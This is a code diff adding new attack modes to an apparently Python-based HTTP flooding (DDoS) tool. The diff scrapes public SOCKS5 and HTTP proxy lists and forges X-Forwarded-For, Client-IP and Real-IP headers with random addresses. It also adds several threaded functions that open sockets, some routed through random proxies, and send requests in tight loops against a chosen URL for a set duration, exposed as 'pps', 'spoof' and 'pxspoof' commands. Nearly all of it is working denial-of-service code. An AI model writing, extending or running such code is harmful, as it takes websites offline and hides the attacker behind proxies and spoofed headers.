@@ -34,6 +34,19 @@ def get_target(url):
         pass
     return target
 
+def get_proxylist(type):
+    if type == "SOCKS5":
+        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
+        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
+        open("./resources/socks5.txt", 'w').write(r)
+        r = r.rstrip().split('\r\n')
+        return r
+    elif type == "HTTP":
+        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
+        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
+        open("./resources/http.txt", 'w').write(r)
+        r = r.rstrip().split('\r\n')
+        return r
 
 def get_proxies():
     global proxies
@@ -72,6 +85,24 @@ def get_cookie(url):
         time.sleep(1)
     driver.quit()
     return False
+
+def spoof(target):
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return (
+        "X-Forwarded-Proto: Http\r\n"
+        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
+        f"Via: {spoofip}\r\n"
+        f"Client-IP: {spoofip}\r\n"
+        f'X-Forwarded-For: {spoofip}\r\n'
+        f'Real-IP: {spoofip}\r\n'
+    )
+
 ##############################################################################################
 def get_info_l7():
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
@@ -307,6 +338,148 @@ def AttackSOC(target, until_datetime, req):
         except:
             pass
 #endregion
+
+def LaunchPPS(url, th, t):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackPPS, args=(target, until))
+            thd.start()
+        except:
+            pass
+
+def AttackPPS(target, until_datetime): #
+    if target['scheme'] == 'https':
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+    else:
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            try:
+                for _ in range(100):
+                    s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
+            except:
+                s.close()
+        except:
+            pass
+
+def LaunchNULL(url, th, t):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req += "User-Agent: null\r\n"
+    req += "Referrer: null\r\n"
+    req += spoof(target) + "\r\n"
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
+            thd.start()
+        except:
+            pass
+
+def AttackNULL(target, until_datetime, req): #
+    if target['scheme'] == 'https':
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+    else:
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            pass
+
+def LaunchSPOOF(url, th, t):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req += "User-Agent: " + random.choice(ua) + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += spoof(target)
+    req += "Connection: Keep-Alive\r\n\r\n"
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
+            thd.start()
+        except:
+            pass
+
+def AttackSPOOF(target, until_datetime, req): #
+    if target['scheme'] == 'https':
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+    else:
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            pass
+
+def LaunchPXSPOOF(url, th, t, proxy):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req += "User-Agent: " + random.choice(ua) + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += spoof(target)
+    req += "Connection: Keep-Alive\r\n\r\n"
+    for _ in range(int(th)):
+        try:
+            randomproxy = random.choice(proxy)
+            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
+            thd.start()
+        except:
+            pass
+
+def AttackPXSPOOF(target, until_datetime, req, proxy): #
+    proxy = proxy.split(":")
+    print(proxy)
+    try:
+        if target['scheme'] == 'https':
+            s = socks.socksocket()
+            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            s.connect((str(target['host']), int(target['port'])))
+            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+        else:
+            s = socks.socksocket()
+            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            s.connect((str(target['host']), int(target['port'])))
+    except:
+        return
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            pass
 
 #region CFB
 def LaunchCFB(url, th, t):
@@ -669,7 +842,11 @@ def layer7():
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"get    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Get Request Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Post Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Head Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
-#    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                 "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pps    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Only GET / HTTP/1.1                      "+Fore.LIGHTCYAN_EX+"║\n")
+    
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                 "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxspoof"+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack With Proxy      "+Fore.LIGHTCYAN_EX+"║\n")
+    
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"soc    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Socket Attack                            "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxraw  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                     "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsoc  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
@@ -764,6 +941,25 @@ def command():
             timer.start()
             LaunchPXCFB(target, thread, t)
             timer.join()
+    elif command == "pps" or command == "PPS":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchPPS(target, thread, t)
+        timer.join() 
+    elif command == "spoof" or command == "SPOOF":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchSPOOF(target, thread, t)
+        timer.join() 
+    elif command == "pxspoof" or command == "PXSPOOF":
+        target, thread, t = get_info_l7()
+        #timer = threading.Thread(target=countdown, args=(t,))
+        #timer.start()
+        LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
+        #timer.join()
+        time.sleep(1000)
     elif command == "get" or command == "GET":
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
